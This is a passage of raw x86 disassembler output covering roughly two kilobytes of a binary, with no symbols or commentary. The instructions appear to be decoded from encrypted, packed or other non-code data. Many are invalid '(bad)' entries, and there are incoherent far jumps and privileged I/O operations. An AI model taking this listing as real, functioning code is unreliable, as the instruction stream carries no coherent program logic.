  414668:	call   0x3d:0x66b4b650
  41466f:	cs jg  0x41465c
  414672:	in     eax,dx
  414673:	out    0xc1,al
  414675:	idiv   DWORD PTR [ebx-0xf9094e0]
  41467b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41467c:	aaa    
  41467d:	das    
  41467e:	pop    esp
  41467f:	stc    
  414680:	ficomp DWORD PTR [ecx-0x7ad4fa8]
  414686:	xor    DWORD PTR [eax-0x28],0xffffffa7
  41468a:	pop    ds
  41468b:	xor    al,0x16
  41468d:	cld    
  41468e:	inc    edx
  41468f:	out    dx,al
  414690:	mov    bl,0x5f
  414692:	cwde   
  414693:	pop    esp
  414694:	push   esi
  414695:	cmc    
  414696:	sub    bl,BYTE PTR [ecx-0x3b5cc05c]
  41469c:	pop    edx
  41469d:	fmulp  st(0),st
  41469f:	les    edx,FWORD PTR [eax+0x34]
  4146a2:	mul    DWORD PTR [esp+edx*4]
  4146a5:	aas    
  4146a6:	sbb    BYTE PTR [ebx+edx*4],0xaf
  4146aa:	xor    ecx,DWORD PTR [esi]
  4146ac:	or     al,0xae
  4146ae:	adc    eax,0x944ec71
  4146b3:	dec    eax
  4146b4:	adc    DWORD PTR [esi-0x56],esp
  4146b7:	push   0x5a
  4146b9:	nop
  4146ba:	sti    
  4146bb:	pop    ss
  4146bc:	(bad)  
  4146be:	rcl    DWORD PTR [esi],0x62
  4146c1:	push   edi
  4146c2:	cmp    al,0x9e
  4146c4:	xchg   ebx,eax
  4146c5:	xor    cl,BYTE PTR [edx-0x44]
  4146c8:	cld    
  4146c9:	push   0x25
  4146cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146cc:	sbb    eax,0x9e9b2e5b
  4146d1:	push   ebp
  4146d2:	mov    eax,0x29aca337
  4146d7:	jnp    0x414679
  4146d9:	sar    BYTE PTR [edx],0x6a
  4146dc:	mov    esi,ds
  4146de:	dec    esp
  4146df:	xor    eax,0x245f7ccb
  4146e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146e5:	addr16 cwde 
  4146e7:	mov    DWORD PTR es:[edi+0x3c],ebp
  4146eb:	sub    edx,ebx
  4146ed:	cwde   
  4146ee:	test   ah,al
  4146f0:	clc    
  4146f1:	push   ecx
  4146f2:	push   es
  4146f3:	cmp    al,0x46
  4146f5:	adc    cl,al
  4146f7:	(bad)  
  4146f8:	lods   eax,DWORD PTR ds:[esi]
  4146f9:	sub    al,0x5b
  4146fb:	xchg   esi,eax
  4146fc:	es xchg edi,eax
  4146fe:	scas   eax,DWORD PTR es:[edi]
  4146ff:	push   ebx
  414700:	retf   
  414701:	add    BYTE PTR [ecx+0x35d2d326],ah
  414707:	jmp    0x8768:0xedd8e6ed
  41470e:	sar    edi,1
  414710:	pop    es
  414711:	xchg   ecx,eax
  414712:	mov    ah,0x12
  414714:	lds    ecx,FWORD PTR [edx-0x3b]
  414717:	mul    BYTE PTR [ebp+0x57]
  41471a:	sbb    DWORD PTR [esi+0x2d],esp
  41471d:	sbb    al,0xff
  41471f:	push   edi
  414720:	(bad)  
  414721:	stc    
  414722:	outs   dx,BYTE PTR ds:[esi]
  414723:	mov    ah,0xb0
  414725:	retf   0xca9c
  414728:	cmp    cl,BYTE PTR [ebx]
  41472a:	sub    DWORD PTR [eax+eiz*1+0x15],eax
  41472e:	mov    ebp,0xb19ba147
  414733:	cmp    esi,ecx
  414735:	push   esp
  414736:	pusha  
  414737:	push   ss
  414738:	aam    0x23
  41473a:	mov    ds:0xb40747a5,al
  41473f:	inc    esp
  414740:	and    eax,0xc48c9a05
  414745:	cmp    BYTE PTR [ecx],dh
  414747:	(bad)  
  414748:	pop    ecx
  414749:	adc    eax,0x99007bac
  41474e:	push   es
  41474f:	ror    DWORD PTR [ebx],0x9b
  414752:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414753:	out    0x2e,al
  414755:	xchg   ch,bl
  414757:	jmp    0x6614:0x373bfc55
  41475e:	ret    0x91e6
  414761:	ret    0x8a9b
  414764:	lods   al,BYTE PTR ds:[esi]
  414765:	cs daa 
  414767:	mov    ah,0x1c
  414769:	pushf  
  41476a:	mov    cl,0xf9
  41476c:	inc    ebx
  41476d:	dec    esi
  41476e:	mov    ds:0xc2c2f42d,eax
  414773:	mov    al,ds:0x66359b7
  414778:	mov    WORD PTR [esi+0x24ccd55d],?
  41477e:	jl     0x4147c2
  414780:	fs ins DWORD PTR es:[edi],dx
  414782:	es cmp eax,0xfa743c45
  414788:	cmp    BYTE PTR [ecx],cl
  41478a:	call   0xdaf74c2
  41478f:	mov    ah,0x17
  414791:	les    edi,FWORD PTR [eax]
  414793:	mov    eax,0x499fc955
  414798:	fimul  WORD PTR [esi]
  41479a:	inc    ebp
  41479b:	repnz sbb BYTE PTR [esi-0x6c823d2b],cl
  4147a2:	xor    eax,0x8703c9fc
  4147a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147a8:	dec    ecx
  4147a9:	leave  
  4147aa:	jnp    0x414749
  4147ac:	push   ecx
  4147ad:	fcmovnb st,st(3)
  4147af:	clc    
  4147b0:	imul   eax,DWORD PTR [esi-0x1d5af5b3],0xfab2d5bd
  4147ba:	pop    edx
  4147bb:	je     0x4147f4
  4147bd:	aam    0x84
  4147bf:	fsub   DWORD PTR [edx]
  4147c1:	xor    dl,bh
  4147c3:	and    BYTE PTR [eax+ebp*8],bl
  4147c6:	loope  0x41482f
  4147c8:	jno    0x41478c
  4147ca:	dec    edx
  4147cb:	mov    ch,0xcc
  4147cd:	mov    bh,0x39
  4147cf:	inc    ecx
  4147d0:	(bad)  
  4147d1:	fnstcw WORD PTR [edi-0x34]
  4147d4:	shl    BYTE PTR [ebp-0x7a],0x81
  4147d8:	dec    eax
  4147d9:	push   ecx
  4147da:	ins    DWORD PTR es:[edi],dx
  4147db:	inc    eax
  4147dc:	add    edx,DWORD PTR [eax-0x6aad4a9d]
  4147e2:	mov    ebx,DWORD PTR [edi]
  4147e4:	xor    ebp,eax
  4147e6:	xor    BYTE PTR [eax+0x7877c55f],cl
  4147ec:	daa    
  4147ed:	call   0xd6d4fbc0
  4147f2:	stc    
  4147f3:	stos   DWORD PTR es:[edi],eax
  4147f4:	sar    DWORD PTR [ebx+ecx*1+0x13338cb8],cl
  4147fb:	xchg   ebx,eax
  4147fc:	loopne 0x414860
  4147fe:	cli    
  4147ff:	ja     0x4147e3
  414801:	fimul  DWORD PTR [edi-0x28ac7249]
  414807:	fs es xor BYTE PTR ss:[edi-0x179faf96],0x33
  414811:	cwde   
  414812:	mov    bh,0xfa
  414814:	cmp    al,0x15
  414816:	jbe    0x414821
  414818:	mov    al,ds:0xa480895c
  41481d:	jmp    0x4147a4
  41481f:	jmp    0xb372a401
  414824:	(bad)  
  414825:	int    0x95
  414827:	xchg   DWORD PTR [ecx],esi
  414829:	push   edx
  41482a:	ror    BYTE PTR [ebx],cl
  41482c:	daa    
  41482d:	lods   eax,DWORD PTR ds:[esi]
  41482e:	ds repnz pop esp
  414831:	dec    esp
  414832:	(bad)  
  414833:	test   al,0x26
  414835:	not    DWORD PTR [ebp+0xb]
  414838:	fimul  WORD PTR [ebx]
  41483a:	lods   al,BYTE PTR ds:[esi]
  41483b:	loopne 0x4147d0
  41483d:	arpl   di,si
  41483f:	pop    esp
  414840:	mov    eax,0xf8184075
  414845:	outs   dx,DWORD PTR ds:[esi]
  414846:	xchg   DWORD PTR ds:0x581354c2,edi
  41484c:	bound  ecx,QWORD PTR [ecx-0x33db1581]
  414852:	(bad)  
  414853:	lahf   
  414854:	xchg   edi,eax
  414855:	mov    ds,WORD PTR [ebp+0x45cf4996]
  41485b:	push   edx
  41485c:	dec    ecx
  41485d:	retf   0x8a5a
  414860:	dec    ebx
  414861:	ins    DWORD PTR es:[edi],dx
  414862:	pop    ebp
  414863:	imul   DWORD PTR [ebx-0x57]
  414866:	cmp    bh,BYTE PTR [eax+edi*2+0x59]
  41486a:	and    eax,esi
  41486c:	jne    0x414887
  41486e:	xor    BYTE PTR [eax+0x3],bh
  414871:	(bad)  
  414872:	les    ebx,FWORD PTR [ebp+0x44]
  414875:	inc    edx
  414876:	push   eax
  414877:	mov    DWORD PTR [ecx],edi
  414879:	or     BYTE PTR [edi+0x1c537906],ch
  41487f:	aam    0xe9
  414881:	xchg   ecx,eax
  414882:	(bad)  
  414884:	push   ds
  414885:	inc    ebx
  414886:	mov    edx,0x323078d4
  41488b:	imul   ebp,DWORD PTR [eax+0x2f],0xbdd6794e
  414892:	dec    eax
  414893:	jecxz  0x414890
  414895:	mov    eax,0x90040ede
  41489b:	pop    esp
  41489c:	mov    eax,0x434ff16e
  4148a1:	mov    WORD PTR [ecx+esi*4-0x185c90e4],ss
  4148a8:	add    ebp,esi
  4148aa:	or     al,0x3b
  4148ac:	ins    DWORD PTR es:[edi],dx
  4148ad:	je     0x414854
  4148af:	stos   DWORD PTR es:[edi],eax
  4148b0:	lea    eax,[ebx-0x77ada7dd]
  4148b6:	push   ebx
  4148b7:	loopne 0x4148a4
  4148b9:	inc    esp
  4148ba:	jg     0x4148e4
  4148bc:	imul   esi,DWORD PTR [eax-0x1090dfa7],0x66
  4148c3:	sub    esi,ecx
  4148c5:	add    esi,DWORD PTR ds:0xb2ef7652
  4148cb:	sbb    ch,BYTE PTR [edi-0xfc7fc82]
  4148d1:	xor    eax,0x26a3164c
  4148d6:	stos   DWORD PTR es:[edi],eax
  4148d7:	mov    dh,cl
  4148d9:	or     al,0x62
  4148db:	mov    cl,0xd4
  4148dd:	pop    esp
  4148de:	xor    ch,BYTE PTR ds:0xd1096dbb
  4148e4:	test   eax,0x7dabd38
  4148e9:	(bad)  
  4148eb:	cmp    DWORD PTR [esi+0x2d],ebx
  4148ee:	cmp    BYTE PTR [ecx],ch
  4148f0:	minps  xmm0,XMMWORD PTR [eax]
  4148f3:	jo     0x414935
  4148f5:	push   esi
  4148f6:	inc    esp
  4148f7:	shl    DWORD PTR [ecx+0x65],0x5c
  4148fb:	test   DWORD PTR [ebx],esi
  4148fd:	pop    ecx
  4148fe:	add    eax,0xca19083b
  414903:	test   BYTE PTR ds:0xda3b04d3,ah
  414909:	ret    0xbb77
  41490c:	pop    ds
  41490d:	repz pop ecx
  41490f:	xor    BYTE PTR [eax+0x49],al
  414912:	sbb    BYTE PTR [eax-0x61],0x41
  414916:	(bad)  
  414917:	out    0xb6,eax
  414919:	cmp    al,0xce
  41491b:	je     0x414984
  41491d:	inc    eax
  41491e:	loopne 0x414934
  414920:	xchg   edx,eax
  414921:	cdq    
  414922:	ds sbb al,0xe2
  414925:	(bad)
  414929:	xchg   ebx,esi
  41492b:	mov    ?,edi
  41492d:	and    al,0x87
  41492f:	mov    dh,BYTE PTR [ebx+0x339539fe]
  414935:	shl    BYTE PTR [edi+0xb],0xfc
  414939:	ss sahf 
  41493b:	xor    eax,0x767876df
  414940:	fs aad 0x4d
  414943:	fbld   TBYTE PTR [eax-0x724cc069]
  414949:	rcr    DWORD PTR [edx],1
  41494b:	ret    
  41494c:	cmp    esi,DWORD PTR [edx+esi*4-0x5f]
  414950:	mov    cl,BYTE PTR [eax+0x51dfac73]
  414956:	mov    bl,0x2d
  414958:	adc    esp,ebx
  41495a:	ror    BYTE PTR [ecx],cl
  41495c:	mov    ebx,0xc0e0ddf9
  414961:	test   BYTE PTR [eax+esi*2-0xef925f1],dh
  414968:	push   ebp
  414969:	sub    BYTE PTR [edi],al
  41496b:	or     al,0xd2
  41496d:	cmp    ebx,DWORD PTR [edx-0x2d]
  414970:	bound  ebx,QWORD PTR [esi+0x79]
  414973:	ror    edi,cl
  414975:	test   BYTE PTR [esi],bl
  414977:	xor    eax,0xec31d7f9
  41497c:	fs jmp 0x62592d2c
  414982:	js     0x414928
  414984:	rcr    DWORD PTR [esi+0x36],cl
  414987:	or     al,0x35
  414989:	and    eax,0x5d0a9272
  41498e:	lods   al,BYTE PTR ds:[esi]
  41498f:	aad    0xe0
  414991:	sub    eax,0x487df9d5
  414996:	mov    edx,0x99d6c77f
  41499b:	fistp  WORD PTR [esi-0x3a]
  41499e:	sub    edi,DWORD PTR [ecx-0x432b21cc]
  4149a4:	outs   dx,DWORD PTR ds:[esi]
  4149a5:	xor    al,0x2a
  4149a7:	jnp    0x4149c7
  4149a9:	or     eax,0x425e562a
  4149ae:	ins    DWORD PTR es:[edi],dx
  4149af:	sbb    al,al
  4149b1:	dec    BYTE PTR fs:[ebx]
  4149b4:	pushf  
  4149b5:	outs   dx,DWORD PTR ds:[esi]
  4149b6:	imul   edi,DWORD PTR [edx+edi*4-0x4a],0xffffff90
  4149bb:	sbb    ecx,DWORD PTR [ecx]
  4149bd:	fistp  DWORD PTR [esi+0x31]
  4149c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149c1:	inc    edx
  4149c2:	dec    eax
  4149c3:	push   eax
  4149c4:	ret    
  4149c5:	push   esp
  4149c6:	xor    eax,0x76a124e
  4149cb:	les    eax,FWORD PTR [esi-0x3f]
  4149ce:	cmp    BYTE PTR [ebp+0x3c5ea0c6],al
  4149d4:	jne    0x414a29
  4149d6:	(bad)
  4149d9:	or     bh,BYTE PTR [edx+0x39aec788]
  4149df:	popf   
  4149e0:	fdivr  st,st(5)
  4149e2:	jo     0x41499e
  4149e4:	iret   
  4149e5:	and    BYTE PTR [ebx],ch
  4149e7:	push   esp
  4149e8:	pop    edx
  4149e9:	sbb    DWORD PTR [ecx+edx*1],ebp
  4149ec:	sbb    BYTE PTR [ecx+edx*4+0x1c130f41],ah
  4149f3:	xor    BYTE PTR [ebx],cl
  4149f5:	out    dx,eax
  4149f6:	rcl    DWORD PTR [ebx],1
  4149f8:	push   es
  4149f9:	dec    ecx
  4149fa:	or     DWORD PTR [edx+0x70],esi
  4149fd:	lahf   
  4149fe:	and    DWORD PTR [ecx-0x695f273a],0x245ee325
  414a08:	and    DWORD PTR [ebp+edx*2+0x3f],eax
  414a0c:	inc    ebp
  414a0d:	sub    al,0x57
  414a0f:	add    BYTE PTR [edi-0x6f],0x73
  414a13:	ret    0x782b
  414a16:	jb     0x4149f3
  414a18:	stc    
  414a19:	pop    esp
  414a1a:	fdivr  DWORD PTR [ecx+0x71]
  414a1d:	jmp    0x414a45
  414a1f:	sbb    eax,0xbb17e23a
  414a24:	cdq    
  414a25:	cmp    DWORD PTR [ebx-0x78009e29],edx
  414a2b:	mov    edi,0xb95ae990
  414a30:	push   ebp
  414a31:	jb     0x414a78
  414a33:	bound  eax,QWORD PTR [edx-0x58]
  414a36:	add    dh,cl
  414a38:	mov    eax,ds:0x73608160
  414a3d:	mov    cl,0xc
  414a3f:	mov    ah,0x0
  414a41:	cs push ebx
  414a43:	mov    ah,0x2b
  414a45:	pop    ebp
  414a46:	jo     0x414aa2
  414a48:	mov    ah,BYTE PTR [ecx+ebp*8]
  414a4b:	cmp    ah,BYTE PTR [ebx]
  414a4d:	jns    0x414acc
  414a4f:	sbb    al,0x4c
  414a51:	sbb    dl,BYTE PTR [ebp-0x495e9c87]
  414a57:	xor    ebx,esi
  414a59:	jns    0x414ab8
  414a5b:	popf   
  414a5c:	pushf  
  414a5d:	xlat   BYTE PTR ds:[ebx]
  414a5e:	mov    ebp,0x27f58e73
  414a63:	push   ebp
  414a64:	mov    edi,0x27b64208
  414a69:	das    
  414a6a:	jmp    0x7cb06b57
  414a6f:	sub    al,BYTE PTR [ebx]
  414a71:	push   edi
  414a72:	jge    0x414a64
  414a74:	push   ss
  414a75:	pop    ebp
  414a76:	mov    edx,0x7edf5be5
  414a7b:	dec    ebx
  414a7c:	in     eax,dx
  414a7d:	push   0xb587e3a2
  414a82:	scas   al,BYTE PTR es:[edi]
  414a83:	jo     0x414ab1
  414a85:	cmp    eax,0x324b10eb
  414a8a:	cmp    dl,al
  414a8c:	fstp   st(1)
  414a8e:	push   0x8e045fd4
  414a93:	stc    
  414a94:	mov    edi,0xd0ff4b9f
  414a99:	(bad)  
  414a9a:	dec    esp
  414a9b:	and    BYTE PTR [eax],0x97
  414a9e:	idiv   BYTE PTR [edi+0x3f6f36ec]
  414aa4:	loop   0x414a31
  414aa6:	cmc    
  414aa7:	cs pusha 
  414aa9:	(bad)  
  414aaa:	adc    ebp,DWORD PTR [bx+di]
  414aad:	fstp   DWORD PTR [ebx]
  414aaf:	push   esp
  414ab0:	jae    0x414b0c
  414ab2:	test   BYTE PTR [ecx],dh
  414ab4:	mov    ds:0x49061bd8,eax
  414ab9:	ret    
  414aba:	retf   
  414abb:	repnz or BYTE PTR ds:0x4f5eb6ac,dh
  414ac2:	ins    DWORD PTR es:[edi],dx
  414ac3:	pop    ebx
  414ac4:	xor    BYTE PTR [edx],bl
  414ac6:	fdivr  st(2),st
  414ac8:	test   eax,0x8bfbda8e
  414acd:	mov    BYTE PTR [edi-0x35],ch
  414ad0:	rcl    DWORD PTR [ecx-0x7c],cl
  414ad3:	dec    ebp
  414ad4:	push   cs
  414ad5:	pop    ss
  414ad6:	pop    es
  414ad7:	hlt    
  414ad8:	jg     0x414b44
  414ada:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414adb:	loopne 0x414b19
  414add:	mov    edi,0x52d52afd
  414ae2:	test   eax,0x1adad926
  414ae7:	in     al,dx
  414ae8:	sbb    al,0xc4
  414aea:	xchg   ebp,eax
  414aeb:	not    BYTE PTR [ebx-0x6d]
  414aee:	mov    eax,0xeeedfac5
  414af3:	mov    ah,0xb6
  414af5:	aam    0xd2
  414af7:	or     al,0xc3
  414af9:	mov    ebx,0xa0b602ca
  414afe:	push   es
  414aff:	addr16 jge 0x414b5f
  414b02:	outs   dx,BYTE PTR ds:[esi]
  414b03:	cmc    
  414b04:	stos   BYTE PTR es:[edi],al
  414b05:	(bad)  
  414b06:	sbb    eax,DWORD PTR [edi+esi*4]
  414b09:	xor    DWORD PTR [edx+0x3d],edx
  414b0c:	sahf   
  414b0d:	xchg   esp,eax
  414b0e:	sbb    ebx,DWORD PTR [ebx]
  414b10:	ret    
  414b11:	push   0x17
  414b13:	clc    
  414b14:	or     esp,ebp
  414b16:	pusha  
  414b17:	fiadd  WORD PTR [esi+0x67]
  414b1a:	loopne 0x414aa9
  414b1c:	imul   ebx,ebp,0xffffffd7
  414b1f:	adc    bh,BYTE PTR [edi+0x45a0b90]
  414b25:	dec    esi
  414b26:	fs int 0x72
  414b29:	cs pop es
  414b2b:	fcmovnu st,st(2)
  414b2d:	dec    esi
  414b2e:	push   eax
  414b2f:	jmp    FWORD PTR [ebx-0x3af75b5b]
  414b35:	and    DWORD PTR [edx+0x7804cc2d],0xe949367e
  414b3f:	and    al,0xf3
  414b41:	in     al,0xec
  414b43:	daa    
  414b44:	mov    al,ds:0x6d050951
  414b49:	mov    ds:0x51654ac8,eax
  414b4e:	fwait
  414b4f:	mov    dl,0x45
  414b51:	cwde   
  414b52:	shl    BYTE PTR [edi],0x60
  414b55:	inc    ebp
  414b56:	adc    ah,bl
  414b58:	jmp    0xab83:0x71956b7d
  414b5f:	(bad)  
  414b61:	and    bh,BYTE PTR [ecx+0x50c0dd65]
  414b67:	dec    edx
  414b68:	inc    eax
  414b69:	popa   
  414b6a:	sub    al,0xf4
  414b6c:	lahf   
  414b6d:	in     al,dx
  414b6e:	mov    bl,0x9b
  414b70:	sbb    BYTE PTR [edi+eax*1+0x5f],dl
  414b74:	dec    ecx
  414b75:	leave  
  414b76:	adc    al,0xac
  414b78:	xchg   edx,eax
  414b79:	dec    ebx
  414b7a:	jl     0x414b21
  414b7c:	fistp  QWORD PTR [edi-0x35]
  414b7f:	(bad)  
  414b80:	mov    eax,cr7
  414b83:	mov    bl,0x4a
  414b85:	ss xchg edi,eax
  414b88:	repnz daa 
  414b8a:	sahf   
  414b8b:	add    DWORD PTR [eax],ebp
  414b8d:	push   es
  414b8e:	or     ebx,0xe2f1bccd
  414b94:	mul    BYTE PTR [edx+0x46779d0]
  414b9a:	sub    al,0x4d
  414b9c:	push   0xfe7d0a09
  414ba1:	stos   DWORD PTR es:[edi],eax
  414ba2:	test   BYTE PTR [eax],bl
  414ba4:	in     al,0xcc
  414ba6:	inc    edx
  414ba7:	xchg   edi,eax
  414ba8:	retf   0xb218
  414bab:	retf   
  414bac:	js     0x414bee
  414bae:	mov    ebx,0x20b90267
  414bb3:	inc    ebx
  414bb4:	sbb    bl,BYTE PTR [esi-0x1ba07032]
  414bba:	out    dx,eax
  414bbb:	jmp    0xd97c4d69
  414bc0:	fimul  DWORD PTR [ecx+0x17ccc27d]
  414bc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bc7:	in     eax,0xd6
  414bc9:	pushf  
  414bca:	loop   0x414bf4
  414bcc:	dec    esp
  414bcd:	or     al,0xab
  414bcf:	sbb    al,BYTE PTR [ebx]
  414bd1:	lods   al,BYTE PTR ds:[esi]
  414bd2:	mov    dh,0x19
  414bd4:	mov    dl,0xae
  414bd6:	sub    ebx,DWORD PTR [ebp+esi*8-0xc409826]
  414bdd:	mov    eax,0x1d1bcda3
  414be2:	jb     0x414c26
  414be4:	and    eax,0x8b2fd366
  414be9:	or     DWORD PTR [edi+ebp*2+0x238bc668],esi
  414bf0:	pop    es
  414bf1:	ins    BYTE PTR es:[edi],dx
  414bf2:	pop    ss
  414bf3:	inc    edi
  414bf4:	outs   dx,BYTE PTR ds:[esi]
  414bf5:	fwait
  414bf6:	js     0x414c62
  414bf8:	clc    
  414bf9:	jmp    0x414ba1
  414bfb:	fcomp  QWORD PTR [esi+0x552c3b08]
  414c01:	imul   eax,ecx,0x14
  414c04:	test   eax,0x289e24a8
  414c09:	lock inc eax
  414c0b:	fcom   DWORD PTR [ebx-0x44ad475a]
  414c11:	xchg   BYTE PTR [edi+ebp*1+0x4b5b3c5b],ch
  414c18:	jmp    0x49683e44
  414c1d:	addr16 mov ch,0x78
  414c20:	int    0xb2
  414c22:	cmp    al,BYTE PTR [edx]
  414c24:	cld    
  414c25:	and    cl,bl
  414c27:	pop    edx
  414c28:	mov    ds:0xc14ad148,al
  414c2d:	(bad)  
  414c2e:	jmp    0xe3be:0x9b99c138
  414c35:	cmp    al,0x2d
  414c37:	scas   al,BYTE PTR es:[edi]
  414c38:	ficomp WORD PTR [edx+0xc]
  414c3b:	arpl   WORD PTR [edx-0x25f6bc10],ax
  414c41:	pushf  
  414c42:	sub    al,0x31
  414c44:	jle    0x414c8a
  414c46:	leave  
  414c47:	test   BYTE PTR [si-0x7],dh
  414c4b:	mov    ebx,0x7770110a
  414c50:	jo     0x414c94
  414c52:	fsubr  DWORD PTR [edi+0x203a3b54]
  414c58:	or     BYTE PTR [ecx],bl
  414c5a:	dec    ecx
  414c5b:	mov    al,ds:0xe39ec139
  414c60:	or     DWORD PTR [ebp+0x22600119],esp
  414c66:	inc    ebp
  414c67:	adc    eax,0x47f0c8a6
  414c6c:	sti    
  414c6d:	add    BYTE PTR es:[esp+eax*4+0x44],dh
  414c72:	cld    
  414c73:	out    0x2c,eax
  414c75:	sbb    cl,BYTE PTR [ecx]
  414c77:	mov    dh,0x53
  414c79:	xchg   ebp,eax
  414c7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c7b:	cmp    DWORD PTR [eax+0x14c2dc8e],ecx
  414c81:	ret    0x5010
  414c84:	jge    0x414ca7
  414c86:	adc    BYTE PTR [edi],dl
  414c88:	mov    cl,0xd2
  414c8a:	nop
  414c8b:	test   al,bl
  414c8d:	xor    ebx,DWORD PTR [edx+edx*2-0x33847fb7]
  414c94:	addr16 test al,0xdc
  414c97:	jno    0x414c67
  414c99:	cmp    ebx,DWORD PTR [ecx+0x1be58d61]
  414c9f:	jb     0x414c28
  414ca1:	das    
  414ca2:	out    dx,eax
  414ca3:	ds cmp al,0xf5
  414ca6:	inc    esi
  414ca7:	int    0x16
  414ca9:	mov    eax,ds:0x11903600
  414cae:	xchg   edx,eax
  414caf:	popf   
  414cb0:	sub    BYTE PTR [ebx-0x47b35f1],0x8b
  414cb7:	jo     0x414cf9
  414cb9:	les    edi,FWORD PTR [esi-0x532b244e]
  414cbf:	add    DWORD PTR [eax],ebp
  414cc1:	xor    al,0x4c
  414cc3:	mov    edx,0xb89d0d1e
  414cc8:	(bad)  
  414cc9:	js     0x414c59
  414ccb:	xchg   esp,eax
  414ccc:	xor    esp,esi
  414cce:	sub    eax,0x73662853
  414cd3:	test   DWORD PTR [edx+0x18],0xd2b2d0dc
  414cda:	dec    eax
  414cdb:	lock mov esi,0x2c6b248
  414ce1:	push   ebx
  414ce2:	xor    BYTE PTR [ebx],dh
  414ce4:	dec    edi
  414ce5:	into   
  414ce6:	aas    
  414ce7:	jnp    0x414d5f
  414ce9:	jne    0x414c8c
  414ceb:	push   ecx
  414cec:	icebp  
  414ced:	fsub   QWORD PTR [edx+0x66]
  414cf0:	xchg   esp,eax
  414cf1:	into   
  414cf2:	jb     0x414ce6
  414cf4:	daa    
  414cf5:	dec    eax
  414cf6:	bound  ecx,QWORD PTR [ecx-0x4b5aeafa]
  414cfc:	jp     0x414d45
  414cfe:	xchg   edx,eax
  414cff:	xchg   ebp,eax
  414d00:	mov    ds:0x6f9a6fa1,al
  414d05:	inc    ecx
  414d06:	(bad)  
  414d07:	cmp    DWORD PTR [edi-0x2c38d187],esp
  414d0d:	cld    
  414d0e:	popa   
  414d0f:	ins    BYTE PTR es:[edi],dx
  414d10:	fwait
  414d11:	xor    bl,ch
  414d13:	sahf   
  414d14:	and    DWORD PTR [ebx],ebx
  414d16:	mov    eax,0x45a77df6
  414d1b:	or     DWORD PTR ds:0xf9489085,ecx
  414d21:	je     0x414d6c
  414d23:	push   cs
  414d24:	es loop 0x414cef
  414d27:	lods   eax,DWORD PTR ss:[esi]
  414d29:	data16 jns 0x414cc6
  414d2c:	lods   eax,DWORD PTR ds:[esi]
  414d2d:	pop    edi
  414d2e:	xor    DWORD PTR [edx],0x7e
  414d31:	fistp  DWORD PTR ds:0x1b985369
  414d37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d38:	xchg   edi,eax
  414d39:	and    al,0xfd
  414d3b:	or     ecx,0x431e5681
  414d41:	les    esi,FWORD PTR [esi]
  414d43:	mov    edx,DWORD PTR [edx+0x76]
  414d46:	mov    ds:0x8261792,al
  414d4b:	ds call 0x27b3:0xd9a6c741
  414d53:	popa   
  414d54:	dec    edx
  414d55:	(bad)  
  414d57:	femms  
  414d59:	mov    ebp,0x164a9b04
  414d5e:	pop    eax
  414d5f:	ja     0x414dca
  414d61:	adc    ebp,0x219ef6a6
  414d67:	sbb    ecx,DWORD PTR [eax]
  414d69:	(bad)  
  414d6a:	sub    eax,edx
  414d6c:	test   al,0x4
  414d6e:	mov    al,0xc8
  414d70:	and    al,0x9f
  414d73:	js     0x414dd3
  414d75:	(bad)  
  414d77:	sbb    ch,BYTE PTR [ecx+0x74]
  414d7a:	or     cl,BYTE PTR fs:[ebx]
  414d7d:	mov    ch,0xa
  414d7f:	sbb    BYTE PTR ds:0x38301ce3,dl
  414d85:	stc    
  414d86:	shr    al,0x27
  414d89:	pusha  
  414d8a:	mov    ds:0x5941cd23,eax
  414d8f:	inc    edi
  414d90:	arpl   sp,cx
  414d92:	or     eax,0x4c34104b
  414d97:	gs adc eax,0x22b92fd0
  414d9d:	xor    DWORD PTR [ebp-0x6f],eax
  414da0:	fs pusha 
  414da2:	sub    edx,DWORD PTR [edi]
  414da4:	mov    esi,0x900bde87
  414da9:	mov    ch,0xec
  414dab:	xchg   edx,eax
  414dac:	xor    ah,0x3d
  414daf:	cwde   
  414db0:	jge    0x414daf
  414db2:	lods   al,BYTE PTR ds:[esi]
  414db3:	shl    BYTE PTR [edx+0x36],cl
  414db6:	lods   eax,DWORD PTR ds:[esi]
  414db7:	das    
  414db8:	ins    DWORD PTR es:[edi],dx
  414db9:	cld    
  414dba:	xor    ch,BYTE PTR [ecx+0x39e16b42]
  414dc0:	pop    ebp
  414dc1:	popf   
  414dc2:	and    eax,0xaac1df31
  414dc7:	dec    ebp
  414dc8:	jae    0x414d62
  414dca:	push   ebx
  414dcb:	xchg   al,ah
  414dcd:	mov    ebp,0x62d853db
  414dd2:	mov    dl,0xdd
  414dd4:	daa    
  414dd5:	push   cs
  414dd6:	aam    0xbe
  414dd8:	jns    0x414e0a
  414dda:	pop    ebx
  414ddb:	xchg   BYTE PTR [eax+0x2f],al
  414dde:	jnp    0x414da1
  414de0:	jns    0x414e4b
  414de2:	mov    esi,0xfe09a709
  414de7:	pop    ebx
  414de8:	pushf  
  414de9:	pusha  
  414dea:	xchg   ecx,eax
  414deb:	loopne 0x414d89
  414ded:	mov    edx,0xdc662304
  414df2:	or     al,cl
  414df4:	inc    ebp
  414df5:	enter  0xe87c,0x0
  414df9:	cmp    DWORD PTR [ecx],0xea64d4f4
  414dff:	inc    edi
  414e00:	(bad)  
  414e01:	pop    ds
  414e02:	cmp    BYTE PTR [ecx-0x6c],dl
  414e05:	std    
  414e06:	inc    esp
  414e07:	cmp    BYTE PTR [eax-0x678767f0],ch
  414e0d:	mov    dl,0xa1
  414e0f:	arpl   WORD PTR [eax-0x5765dae1],si
  414e15:	into   
  414e16:	sub    al,0x3e
  414e18:	mov    BYTE PTR [eax],dh
  414e1a:	test   DWORD PTR [ebx+edx*2+0x78b0401b],ecx
  414e21:	mov    dl,0xf1
  414e23:	test   al,0x86
  414e25:	mov    dl,0xef
  414e27:	imul   ebx,DWORD PTR [edx+ecx*1-0x2722ae13],0xffffffc8
  414e2f:	mov    dl,0x9c
  414e31:	sbb    eax,0x525e0bb8
  414e36:	xor    al,0x18
  414e38:	imul   edx,DWORD PTR [eax],0x65
  414e3b:	test   DWORD PTR [eax-0x4],0x108a9dee
